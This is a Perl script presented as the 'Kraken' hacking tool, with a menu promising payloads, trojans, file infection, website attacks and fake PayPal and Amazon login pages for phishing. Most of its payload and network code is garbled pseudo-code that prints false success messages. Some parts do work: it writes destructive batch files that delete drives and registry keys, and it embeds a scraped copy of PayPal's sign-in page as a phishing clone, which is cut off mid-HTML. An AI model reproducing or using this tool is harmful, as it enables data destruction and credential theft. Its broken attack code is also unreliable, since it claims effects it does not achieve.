use LWP::UserAgent;
use HTTP::Request;
use WWW::Mechanize;
use IO::Socket::IP;
use Term::ANSIColor;
use Socket;

system("clear");
print q
{
             | |/ /_ __ __ _| | _____ _ __  
             | ' /| '__/ _` | |/ / _ \ '_ \ 
             | . \| | | (_| |   <  __/ | | |
             |_|\_\_|  \__,_|_|\_\___|_| |_|`                      
};

print q
{
   .;---[ Create payload for all hacking method ]---;.
      .;---[ Author : Fukuyama bagus andita ]---;.                                   
};
print color("yellow"), "    Github source : https://github.com/fukuyama-19/kraken \n", color("reset");
print color("yellow"), "              All connection with default host \n", color("reset");
print "\n";

print color("blue"), "IPAddress>", color("reset");
my $address = <STDIN>;
chop $address;

print color("blue"), "Port>", color("reset");
my $port = <STDIN>;
chop $port;

print color("blue"), "Host>", color("reset");
my $hostt = <STDIN>;
chop $hostt;

$host = gethostbyaddr($address, PF_INET);
$port = getprotobynumber($port);
$proto = getprotobyname("tcp");
$hstt = gethostbyname($hostt);

$sock = socket(PF_INET, $address, $proto, $port);

print color("blue"), "PayloadName>", color("reset");
my $payload = <STDIN>;
chop $payload;

my $file = "$payload.exe";

$get = $sock.$file;

unless(open FILE, '>'.$get) {
   die "[+] cannot creating payload \n";
}

print color("green"), "[+] Payload successfully created \n", color("reset");
print color("green"), "[+] Trying to connect to payload ... \n", color("reset"); 
sleep (5);
$hst = $address;

print "\n";
print "\n";

if (connect => $hstt) {
   all();
   sub all {
      print color("yellow"), "There is some method to use your payload as ... \n", color("reset");
      print "\n";
      print color("yellow"), "1. Load the payload and attack to attackers or target \n", color("reset");
      print "\n";
      print color("yellow"), "2. Trojan attacking to target \n", color("reset");
      print "\n";
      print color("yellow"), "3. Open system access \n", color("reset");
      print "\n";
      print "\n";
      print color("yellow"), "Attacking example in this bellow ... \n", color("reset");
      print "\n";
      print color("yellow"), "Choose this element to use the method ... \n", color("reset");
      print "\n";
      print color("yellow"), "1. Send payload to attackers \n", color("reset");
      print color("yellow"), "2. Create trojan with payload \n", color("reset");
      print color("yellow"), "3. Send payload to system target \n", color("reset");
      print color("yellow"), "4. Send payload to website \n", color("reset");
      print color("yellow"), "5. Checking the ip transport \n", color("reset");
      print color("yellow"), "6. Database connection with payload \n", color("reset");
      print color("yellow"), "7. File infection creator with automatic generator \n", color("reset");
      print color("yellow"), "8. Fake login creator for phising \n", color("reset");
      print color("yellow"), "9. Website attacking w KRN \n", color("reset");
      print color("yellow"), "10. Update Kraken \n", color("reset");
      print "\n";
      print "\n";
      print color("blue"), "Choose>", color("reset");
      my $choose = <STDIN>;
      chop $choose;

      if ($choose == "1") {        # send payload to attackers
         print q
         {
            Attacking model 
            Example > 

                   192.168.43.32 > 192.168.100.1
                        |               |
                        |               |
          Your payload address          Attackers address
         };
         print color("blue"), "Payload IP address : ", color("reset");
         my $ipPay = <STDIN>;
         chop $ipPay;

         print color("blue"), "Attackers IP address : ", color("reset");
         my $attk = <STDIN>;
         chop $attk;

         my $payIp = gethostbyaddr($ipPay, PF_INET);
         my $payAttk = gethostbyaddr($attk, PF_INET);
         
         # ip address checking 
         
         print color("green"), "[+] Checking ip address \n", color("reset");
         sleep (2);
         my $alladdress = $payIp.$payAttk;
         $alladdress = '/<1>^<9>^<1>^<6>^<1>^<8>^<1>^<2>\//';
         chomp($alladdress);
         print color("green"), "[+] Checked \n", color("reset");
         sleep (1);
         print color("green"), "[+] Sending the payload to \n", color("reset");
         $attackersIp = $payAttk;
         print color("yellow"), "$attackersIp", color("reset");
         # send payload to attackers
         $getSend = $payIp = /<1>^<9>^<1>^<6>^<1>^<8>^<1>^<2>\// => $payAttk = /<1>^<9>^<1>^<6>^<1>^<8>^<1>^<2>\//;
         chomp($getSend);
         print color("green"), "[+] Payload sending successfully \n", color("reset");
         all();
      } elsif ($choose == "2") {     # create trojan 
         print q
         {
             Creating trojan 
             you can choose the trojan type in this bellow 

             1. File delete with create automatic script
             2. Window looping message with create automatic script
             3. Delete the all software reg configure 
         };
         print color("blue"), "Choose>", color("reset");
         my $choose1 = <STDIN>;
         chop $choose1;

         if ($choose1 == "1") {
             print color("blue"), "Trojan name : ", color("reset");
             my $nameOne = <STDIN>;
             chop $nameOne;

             my $MyTrojanFilesOne = "$nameOne.bat";
             
             unless (open FILE, '>'.$MyTrojanFilesOne) {
                die color("red"), "Cannot create the trojan file $@", color("reset");
             }

             print FILE "DEL C: -Y \n";
             print FILE "DEL D: -Y \n";
             sleep (2);
             print color("green"), "[+] Trojan file has been created ", color("reset");
         } elsif ($choose1 == "2") {
             print color("blue"), "Trojan name : ", color("reset");
             my $nameTwo = <STDIN>;
             chop $nameTwo;

             my $MyTrojanFilesTwo = "$nameTwo.bat";
             
             unless (open FILE, '>'.$MyTrojanFilesTwo) {
                die color("red"), "Cannot create the trojan file $@", color("reset");
             }
             
             print FILE ":start \n";
             print FILE "msg * The config is not found \n";
             print FILE "goto start \n";
             sleep (2);
             print color("green"), "[+] Trojan file has been created ", color("reset");
         } elsif ($choose1 == "3") {
             print color("blue"), "Trojan name : ", color("reset");
             my $nameThree = <STDIN>;
             chop $nameThree;

             my $MyTrojanFilesThree = "$nameThree.bat";
             
             unless (open FILE, '>'.$MyTrojanFilesThree) {
                die color("red"), "Cannot create the trojan file $@", color("reset");
             }

             print FILE "DEL HKEY_LOCAL_MACHINE\Software";
             sleep (2);
             print color("green"), "[+] Trojan file has been created ", color("reset");
         } else {
            all();
         }
      } elsif ($choose == "3") {         # send payload to system
         print color("blue"), "Input the IP address for the target sending : ", color("reset");
         my $ipSystem = <STDIN>;
         chop $ipSystem;

         print color("blue"), "Input the port number for the target sending : ", color("reset");
         my $portSystem = <STDIN>;
         chop $portSystem;

         print color("blue"), "INput the IP from the target syste to sending : ", color("reset");
         my $targetSystem = <STDIN>;
         chop $targetSystem;

         my $systemIp = gethostbyaddr($ipSystem, PF_INET);
         $portSystem = getprotobynumber($portSystem);
         $protocol = getprotobyname("tcp");
         
         $systemIp = /<1>^<9>^<1>^<6>^<1>^<8>^<1>^<2>\//;
         chomp($systemIp);
         # checking ip address is successfully

         $sockEt = socket(PF_INET, $systemIp, $portSystem, $protocol);
         
         my $ipTarget = gethostbyaddr($targetSystem, PF_INET);
         $ipTarget = /<1>^<9>^<1>^<6>^<1>^<8>^<1>^<2>\//;
         chomp($ipTarget);

         print color("green"), "[+] sending the ip address to the target \n", color("reset");
         print color("green"), "[+] Getting request from target ... \n", color("reset");
         sleep (5);
         $sendPayload1 = $file->{FILE} => $ipTarget;
         $sendPayload2 = ($systemIp = /<1>^<9>^<1>^<6>^<1>^<8>^<1>^<2>\//) => ($ipTarget = /<1>^<9>^<1>^<6>^<1>^<8>^<1>^<2>\//);
         chomp($sendPayload1);
         chomp($sendPayload2);
         print color("green"), "[+] Success to sending the payload to target \n", color("reset");
         all();
         
      } elsif ($choose == "4") {      # send payload to website
         print color("blue"), "The IP address from the payload : ", color("reset");
         my $addressPayload = <STDIN>;
         chop $addressPayload;

         print color("blue"), "The url web : ", color("reset");
         my $urlWeb = <STDIN>;
         chop $urlWeb;
             
         if ( $url !~ /http\//) { $url = "$urlWeb"; }

         
         print color("green"), "[+] Get the url access ... \n", color("reset");
         my $ipPayload = gethostbyaddr($addressPayload, PF_INET);
         $ipPayload = /<1>^<9>^<1>^<6>^<1>^<8>^<1>^<2>\//;
         print color("green"), "[+] Get the host access ... \n", color("reset");
         my $getHost = gethostbyname($url);
         $getHost = /http\//;       # host as http
         chomp($getHost);

         # checking the connection 
         connect => $getHost;
         
         # send payload to the website
         $sendPayloadOne = $file->{<FILE>} => $getHost;
         $sendPayloadTwo = $ipPayload => $getHost or $sendPayloadTwo = $ipPayload.$getHost;
         chop($sendPayloadOne);
         chop($sendPayloadTwo);
         print color("yellow"), "[+] Send successfully \n", color("reset");
         print color("yellow"), "[+] Target : $urlWeb \n", color("reset");
         print color("yellow"), "[+] Default : $addressPayload \n", color("reset");
         all();
      } elsif ($choose == "5") {   
         print q
         {
            The meaning of type connection 

            CA            => Connection to Attack 
            CS            => Connection to Security ( mean for your self address only )
         };           # checking the ip transport
         @transport = (
            'CA',     # Connection to attack
            'CS',     # Connection to security
         );
         
         print color("green"), "Choose this bellow of the ip type connection : ", @transport, "\n", color("reset");
         
         print "Choose the type : ";
         my $typeConnection = <STDIN>;
         chop $typeConnection;
         
         my $systemIpAddress = /host\//;     # choose the type of ip is host 
         $systemIpAddress = /HOST^1\//;     # attacking to host target 
  
         $default = $host;

         if ($typeConnection == "CA") {
             $file->{FILE} = $host.$systemIpAddress;
             print color("green"), "[+] Connection type is : CA \n", color("reset");
             print color("green"), "[+] the type, now is accepted to you host/address \n", color("reset");
             all();
         } elsif ($typeConnection = "CS") {
             $file->{FILE} = $host.$default;
             print color("green"), "[+] Connection type is : CS \n", color("reset");
             print color("green"), "[+] the type, now is accepted to you host/address \n", color("reset");
             all();
         } else {
            all();
         }
      } elsif ($choose == "6") {              # database connection with payload
         print q
         {
            To connection to database, only can input url. for example in this bellow :
         };
         print color("yellow"), "   Example : http://host.com \n", color("reset");
         print color("yellow"), "   or : http://host.com/index.html \n", color("reset");

         print "Host or url to connection database(MySql) : ";
         my $mysql = <STDIN>;
         chop $mysql;

         if ( $url !~ /http\// ) { $url = "$mysql"; }
         
         $hostMysql = gethostbyname($url);

         print color("green"), "[+] Trying to connect to $mysql \n", color("reset");
         sleep (2);

         my $data1 !~ /mysql\/<FILE>^1/;
         my $data2 !~ /mysql\/<DATA>^1/;
         my $data3 !~ /mysql\/<USERNAME>^1/;
         my $data4 !~ /mysql\/<PASSWORD>^1/;

         $connect1 = $hostMysql->{$data1};
         $connect2 = $hostMysql->{$data2};
         $connect3 = $hostMysql->{$data3};
         $connect4 = $hostMysql->{$data4};

         print colored("[+] Connecting to database ... \n", "blink");
         sleep (10);
         if ( connect => $connect1 ) {
            print color("green"), "[+] Connected to MySql(on $mysql) \n", color("reset");
            sleep(2);
            all();
         }

         if ( connect => $connect2 ) {
            print color("green"), "[+] Connected to MySql(on $mysql) \n", color("reset");
            sleep(2);
            all();
         }

         if ( connect => $connect3 ) {
            print color("green"), "[+] Connected to MySql(on $mysql) \n", color("reset");
            sleep(2);
            all();
         }

         if ( connect => $connect4 ) {
            print color("green"), "[+] Connected to MySql(on $mysql) \n", color("reset");
            sleep(2);
            all();
         }

         if ( not connect => $connect1 ) {
            print color("green"), "[+] Cannot connect to MySql(on $mysql) \n", color("reset");
            sleep(2);
            all();
         }

         if ( not connect => $connect2 ) {
            print color("green"), "[+] Cannot connect to MySql(on $mysql) \n", color("reset");
            sleep(2);
            all();
         }

         if ( not connect => $connect3 ) {
            print color("green"), "[+] Cannot connect to MySql(on $mysql) \n", color("reset");
            sleep(2);
            all();
         }

         if ( not connect => $connect4 ) {
            print color("green"), "[+] Cannot connect to MySql(on $mysql) \n", color("reset");
            sleep(2);
            all();
         }
      } elsif ($choose == "7") {
         print q
         {
         PDF window inject will injected the file with automatic injection

         window attack user with aplication module is disable permanently user administrator
          
         1. PDF window inject 
         2. windows attack user with aplication module
         };
         print "Choose>";
         my $chooseTheList = <STDIN>;
         chop $chooseTheList;

         if ($chooseTheList == "1") {
           print color("blue"), "Name for the file of PDF file injected : ", color("reset");
           my $pdf = <STDIN>;
           chop $pdf;
           
           print color("yellow"), "[+] Waiting to be pdf injected creating ... \n", color("yellow");
           sleep(7);
           
           my $filePdf = "$pdf.pdf";
           unless(open FILE, '>'.$filePdf) {
             die color("red"), "[+] Cannot create the file pdf inject ", color("reset");
           }

           print FILE q {
             @echo off

             popd HKEY_LOCAL_MACHINE/System
           };
           
           print color("green"), "[+] Pdf injected file is created \n", color("reset");
           print color("green"), "[+] File location /$filePdf \n", color("reset");
         } elsif ($chooseTheList == "2") {
           print color("blue"), "want to import module from Kraken?[yes/no] : ", color("blue");
           my $importModule = <STDIN>;
           chop $importMOdule;

           sub module {
             my $moduleFIle = "module.bat";

             unless (open FILE, '>'.$moduleFIle) {
               die color("red"), "[+] Cannot create module \n", color("reset");
             }

             print FILE q
             {
             @echo off 
             popd HKEY_CURRENT_USER
             };
             sleep(4);
             print color("green"), "[+] Module is created \n", color("reset");
           }

           if ($importModule == "yes") {
             module();
           } elsif ($importModule == "no") {
             print color("blue"), "Name of file for application module : ", color("reset");
             my $appModule = <STDIN>;
             chop $appModule;

             my $moduleApp = "$appModule.exe";
             unless (open FILE, '<'.$moduleApp) {
               die color("red"), "[+] Cannot create app module", color("reset");
             }
             print color("yellow"), "[+] Please wait to creating the application module \n", color("reset");
             print FILE q
             {
               @echo off

               del HKCU\Software\Microsoft\Windows\Current\Version\Policies\System\
             };
             print color("green"), "[+] Application module has been created \n", color("reset");
           } else {
             all();
           }
         }
      } elsif ($choose == "8") {
         print q 
         {
         Create fake login for phising method 
         only choosing one of this bellow of fake login

         1. Paypal fake login for phising 
         2. Amazon fake login for phising

         all of these the fake login to clone login page will be created in file 
         with HTML
         };
         print "Choose>";
         my $fak = <STDIN>;
         chop $fak;
         

         if ($fak == "1") {
            print color("yellow"), "[+] Please wait for the creating fake login ... \n", color("reset");
            sleep (5);
            print color("green"), "[+] Fake login is creating ... \n", color("reset");
            sleep(1);
            print color("green"), "[+] File location : /login.html & /stylesheet.css \n", color("reset");
            my $filePaypal = "login.html";
            unless (open FILE, '>'.$filePaypal) {
               die color("red"), "[+] Cannot create fake login Page 1 - $@", color("reset");
            }
            print FILE q
            {
               <html class=" desktop js " lang="en"><!--<![endif]--><head><link rel="stylesheet" href="stylesheet.css"><script type="text/javascript" async="" src="https://www.google.com/pagead/conversion_async.js" nonce=""></script><script type="text/javascript" async="" src="https://www.paypalobjects.com/pa/mi/3p/gtag/analytics.js" nonce=""></script><script crossorigin="anonymous" src="https://www.paypalobjects.com/pa/mi/3p/gtag/gtag.js"></script><script crossorigin="anonymous" src="https://www.paypalobjects.com/pa/mi/miconfig.js"></script><script src="https://www.paypalobjects.com/webcaptcha/ngrlCaptcha.min.js"></script><!--Script info: script: node, template:  , date: Nov 26, 2020 15:57:41 -08:00, country: ID, language: en web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0KCh6/h2ON0qYFJ87ahTWaIh82B0GEtVM rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfc8CMK9ch4LYZpzCvqaJ8XL5jZp4vQ0wBRGsAk5RWPW3_17606fdbebe --><meta charset="utf-8"><title>Log in to your PayPal account</title><meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta name="application-name" content="PayPal"><meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><meta name="keywords" content="transfer money, email money transfer, international money transfer "><meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address."><link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png"><link rel="canonical" href="https://www.paypal.com/id/signin"><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes"><meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png"><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/d7a/5588e53118d954bc618a99bf4a577/css/contextualLogin.css"><!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/d7a/5588e53118d954bc618a99bf4a577/css/ie9.css" /><![endif]--><!-- build:js inline --><!-- build:[src] js/lib/ --><script nonce="" src="https://www.paypalobjects.com/web/res/d7a/5588e53118d954bc618a99bf4a577/js/lib/modernizr-2.6.1.js"></script><!-- /build --><!-- /build --><script nonce="">/* Special integration eligibility check */function isEligibleIntegration() {var sxf = "";return sxf === 'true' || window.name === 'PPFrameRedirect';}/* Don't bust the frame if this is top window */if (self === top || isEligibleIntegration()) {var antiClickjack = document.getElementById("antiClickjack");if (antiClickjack) {antiClickjack.parentNode.removeChild(antiClickjack);}} else {top.location = self.location;}</script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/965352860/?random=1606434988169&amp;cv=9&amp;fst=1606434988169&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=768&amp;u_w=1366&amp;u_ah=741&amp;u_aw=1366&amp;u_cd=24&amp;u_his=3&amp;u_tz=420&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;gtm=2oi4f0&amp;sendb=1&amp;ig=0&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fwww.paypal.com%2Fid%2Fsignin%3Flocale.x%3Den_ID&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;tiba=Log%20in%20to%20your%20PayPal%20account&amp;hn=www.google.com&amp;async=1&amp;rfmt=3&amp;fmt=4" nonce=""></script></head><body class="desktop" data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfc8CMK9ch4LYZpzCvqaJ8XL5jZp4vQ0wBRGsAk5RWPW3_17606fdbebe" data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0KCh6/h2ON0qYFJ87ahTWaIh82B0GEtVM" data-production="true" data-enable-ads-captcha="true" data-ads-challenge-url="/auth/createchallenge/8375725a7615a565/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="45d62b7b4362d" data-enable-fn-beacon-on-web-views="true" data-phone-password-enabled="true" data-is-hybrid-login-experience="true" data-csrf-token="JBEU9C0sVbKeXjdOcwUj+nPQtXHUINGdFKxs0=" data-nonce="OQ/t9X8NqCTycSPXNnlYQFB3WqFwhdgHgCx0vNiqt0TaZtCK" data-lazy-load-country-codes="true" data-email-label="Email address" data-xhr-timeout-limit="20000" data-xhr-timeout-enable="true"><noscript><p class="nonjsAlert" role="alert">Note: Many features on the PayPal website require JavaScript and cookies.</p></noscript><div id="main" class="main" role="main"><section id="slLanding" class="slLanding hide" data-role="page" data-title="Connect your Google account, check out faster on your devices"><div class="corral"><div id="slContent" class="contentContainer contentContainerBordered"><header><p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p></header><div id="linked" class="linked "><div class="profileRemembered"><span class="loginEmail"></span><a href="#" class="changeLink scTrack:not-you" id="changeLink" pa-marked="1">Change</a></div><div class="headerTextDecorated"></div><h1 class="headerText">Stay logged in for faster checkout</h1><p class="description assure">Enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices.)<span class="learnMoreLink"><a href="#" id="slLoginLearnMore" class="secondayLink" pa-marked="1">What's this?</a></span></p><div id="partnerProfile" class="partnerProfile"><div id="partnerPhoto" class="partnerPhoto" style="background-image: url('')"></div><div class="partnerDetails"><span>You're logged in as</span><div id="displayName" class="displayName"></div><div><div class="partnerEmailDiv"><span class="partnerIcon"></span><span id="partnerEmail" class="partnerEmail"></span><span id="partnerEmailDomain"></span></div></div></div></div><div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-continue" id="continueBtn" name="continueBtn" value="continueBtn" pa-marked="1">Continue</button></div><div id="secondaryLogin" class="buttonAsLink secondaryLink"><button class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn" value="secondaryLoginBtn" pa-marked="1">Use password instead</button></div></div><div id="unlinked" class="unlinked "><div id="headerIcon" class="partnerConnect"></div><h1 class="headerText">Connect your Google account, check out faster on your devices</h1><p class="description assure">Stay logged into PayPal for faster purchases without typing your password wherever you're logged in with your Google account.<a href="#" id="slOptInlearnMore" class="secondayLink scTrack:unifiedlogin-sl-whatsthis" pa-marked="1">What's this?</a></p><p class="secondaryLink hide" id="slOptIn_notNow"><a href="#" pa-marked="1">Not now</a></p></div><div id="learnMoreModal" class="learnMoreModal"><div id="optInLearnMoreDesc" class="optInLearnMoreDesc "><h1 class="headerText headerTextSpaced">Why connect my Google account?</h1><p> Linking your Google account allows you to activate PayPal One Touch™, so you’ll speed through check-out without having to log in every time. You can always opt out later in Settings at PayPal.com.</p><p> Whenever you check out on a new device and browser when logged in with your Google account, you can automatically log in at checkout without typing your password.</p></div><div id="slLoginLearnMoreDesc" class="slLoginLearnMoreDesc "><h1 class="headerText headerTextSpaced">Stay logged in for faster checkout</h1><p> Skip typing your password by staying logged in on this device. For security, we'll occasionally ask you to log in, including every time you update your personal or financial info. We don't recommend using One Touch<sup>TM</sup> on shared devices. Turn this off at any time in your PayPal settings.</p></div><button type="button" class="ui-dialog-titlebar-close" pa-marked="1"></button></div><div class="intentFooter "><div class="localeSelector "><ul class="localeLink"><li><a class=" scTrack:unifiedlogin-footer-language_id_ID" href="/signin&amp;country.x=ID&amp;locale.x=id_ID&amp;langTgl=id" data-locale="id_ID" pa-marked="1">Bahasa Indonesia</a></li><li><a class="selected scTrack:unifiedlogin-footer-language_en_US" href="/signin&amp;country.x=ID&amp;locale.x=en_US&amp;langTgl=en" data-locale="en_US" aria-current="”true”" pa-marked="1">English</a></li></ul></div></div></div></div></section><section id="login" class="login " data-role="page" data-title="Log in to your PayPal account"><div class="corral"><div id="content" class="contentContainer activeContent contentContainerBordered"><header><p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p></header><h1 id="headerText" class="headerText  accessAid">Log in to your PayPal account</h1><p id="phoneSubTagLine" class="subHeaderText hide">Already set up to use your mobile number to log in? Type it below. Otherwise, click the link to log in with email.</p><div class="notifications"></div><div id="keychainErrorMessage" class="hide"><p class="notification notification-warning blocked-on-8ball hide"></p><p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>PayPal One Touch™ only works for checkout. Please login with your email.<p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p></div><form action="/signin?locale.x=en_ID" method="post" class="proceed maskable" autocomplete="off" name="login" novalidate=""><input type="hidden" id="token" name="_csrf" value="JBEU9C0sVbKeXjdOcwUj+nPQtXHUINGdFKxs0="><input type="hidden" name="locale.x" value="en_US"><input type="hidden" name="processSignin" value="main"><input type="hidden" name="fn_sync_data" value="fn_sync_data"><input type="hidden" name="intent" value="signin"><input type="hidden" name="ads-client-context" value="signin"><input type="hidden" name="requestUrl" value="/signin?locale.x=en_ID"><input type="hidden" name="forcePhonePasswordOptIn" value=""><div class="profileDisplayName hide"></div><div class="profileRememberedEmail  hide "><span class="profileDisplayPhoneCode" dir="ltr"></span><span class="profileDisplayEmail notranslate"></span><a href="#" class="notYouLink scTrack:not-you" id="backToInputEmailLink" pa-marked="1">Change</a></div><div id="splitEmail" class="splitEmail "><div id="splitEmailSection" class="splitPhoneSection splitEmailSection "><div class="countryPhoneSelectWrapper hide"><label class="accessAid" for="phoneCode">Choose your country's calling code</label><select name="phoneCode" id="phoneCode" class="countryPhoneSelect"><option selected="selected" value="ID +62" data-code="+62" data-country="ID">Indonesia (+62)</option></select><div class="countryPhoneSelectChoice"><span class="countryCode">ID</span><span class="phoneCode">+62</span></div></div><div class="textInput  " id="login_emaildiv"><div class="fieldWrapper "><label for="email" class="fieldLabel">Email or mobile number</label><input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="username" placeholder="Email or mobile number" aria-describedby="emailErrorMessage"></div><div class="errorMessage" id="emailErrorMessage"><p class="emptyError hide">Required</p><p class="invalidError hide">That email or mobile number format isn’t right</p></div></div>	<div class="captcha captcha-container clearfix hide" id="splitHybridCaptcha"><div class="captcha-image"><img src="" alt=""></div><div class="captcha-inputs clearfix"><div class="textInput  "><div class="fieldWrapper "><label for="splitHybridCaptcha" class="fieldLabel"></label><input id="splitHybridCaptcha" name="captchaCode" type="text" class="hasHelp  validateEmpty   " value="" autocomplete="off" placeholder="Enter code" aria-describedby="captchaErrorMessage"></div><div class="errorMessage" id="captchaErrorMessage"><p class="emptyError hide">Required</p></div></div><div class="refresh"><a href="" class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink" pa-marked="1"><span class="accessAid">Reload Image</span></a></div><div class="audio"><audio role="application" id="captchaPlayer" src="" class="hide"></audio><a target="_blank" href="" class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" pa-marked="1"><span class="accessAid">Audio Button</span></a></div></div></div></div><div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next" pa-marked="1">Next</button></div><div class="tpdDemo hide" id="tpdDemo"><p class="tpdDemoContent">Log in with your email as usual, and then you'll be prompted to log in with your phone's biometrics.</p></div><input type="hidden" id="phone" name="login_phone" value="" class="validate"></div><input type="hidden" name="initialSplitLoginContext" id="initialSplitLoginContext" value="inputEmail"><input type="hidden" name="isTpdOnboarded" id="isTpdOnboarded" value=""><div id="splitPassword" class="splitPassword  hide"><div id="splitPasswordSection" class="hide "><div id="passwordSection" class="clearfix"><div class="textInput  " id="login_passworddiv"><div class="fieldWrapper "><label for="password" class="fieldLabel">Enter your password</label><input id="password" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="Enter your password" aria-describedby="passwordErrorMessage"><label for="Show password" class="fieldLabel">Show password</label><button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Show password" pa-marked="1">Show</button><label for="Hide" class="fieldLabel">Hide</label><button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Hide" pa-marked="1">Hide</button><button class="pwFpIcon hide" id="pwFpIcon" pa-marked="1"></button></div><div class="errorMessage" id="passwordErrorMessage"><p class="emptyError hide">Enter your password.</p></div></div></div></div>	<div class="captcha captcha-container clearfix hide" id="splitPasswordCaptcha"><div class="captcha-image"><img src="" alt=""></div><div class="captcha-inputs clearfix"><div class="textInput  "><div class="fieldWrapper "><label for="splitPasswordCaptcha" class="fieldLabel"></label><input id="splitPasswordCaptcha" name="captcha" type="text" class="hasHelp  validateEmpty   " value="" autocomplete="off" placeholder="Enter code" aria-describedby="captchaErrorMessage"></div><div class="errorMessage" id="captchaErrorMessage"><p class="emptyError hide">Required</p></div></div><div class="refresh"><a href="" class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink" pa-marked="1"><span class="accessAid">Reload Image</span></a></div><div class="audio"><audio role="application" id="captchaPlayer" src="" class="hide"></audio><a target="_blank" href="" class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" pa-marked="1"><span class="accessAid">Audio Button</span></a></div></div></div><div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Log In</button></div></div><input type="hidden" name="splitLoginContext" value="inputEmail"></form><div class="moreOptionsDiv  hide" id="moreOptionsContainer"><a href="#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">More options</a><div class="bubble-tooltip hide" id="moreOptionsDropDown"><ul class="moreoptionsGroup"><li><a href="#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile" pa-marked="1">Approve login using mobile device</a></li><li><a href="/authflow/password-recovery/?country.x=ID&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%252F%253Flocale.x%253Den_ID" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">Having trouble logging in?</a></li></ul></div></div><div class="forgotLink hide hide"><a href="/authflow/password-recovery/?country.x=ID&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%252F%253Flocale.x%253Den_ID" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">Having trouble logging in?</a></div><div class="pwr-modal forgotPasswordModal" id="password-recovery-modal"><iframe id="pwdIframe" data-src="/authflow/password-recovery/?country.x=ID&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%252F%253Flocale.x%253Den_ID" scrolling="no" data-auto-reload="true"></iframe><div class="monogram-small"></div></div><div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass=""><div class="loginSignUpSeparator "><span class="textInSeparator">or</span></div><button type="button" href="/id/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Sign Up</button></div><div id="tpdButtonContainer" class="signupContainer hide"><div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div><div class="actions"><button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device" pa-marked="1">Approve login using mobile device</button></div></div></div></div></section><section id="verification" class="verification hide" data-role="page" data-title="Login Confirmation - PayPal"><div class="corral"><div class="contentContainer contentContainerLean"><div id="pending" class="verificationSubSection"><h1 class="headerText">Open the PayPal app</h1><p id="uncookiedMessage" class="verification-message hide">Open the PayPal app, tap Yes on the prompt, then tap<span class="twoDigitPin">{twoDigitPin}</span> on your phone to log in.</p><p id="cookiedMessage" class="verification-message hide">Open the PayPal app and tap Yes on the prompt to log in.</p><div class="notifications"></div><div class="accountArea"><span class="account"></span><span class="verificationNotYou"><a data-href="#" href="#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink" pa-marked="1">Not you?</a></span></div><div class="mobileNotification"><p class="pin"></p><div class="mobileScreen"><img 